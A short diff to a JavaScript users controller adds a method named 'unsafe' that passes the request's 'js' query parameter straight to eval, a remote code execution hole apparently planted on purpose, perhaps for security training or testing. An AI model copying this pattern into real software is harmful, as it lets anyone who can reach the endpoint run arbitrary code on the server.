@@ -10,6 +10,10 @@ class UsersController extends Controller {
         super(User)
     }
 
+    unsafe(req, res, next){
+      eval(req.query.js);
+    }
+
     find(req, res, next, user) {
       console.log("User", user)
       // Check if user is an admin, if he is, then he can access /api/users info
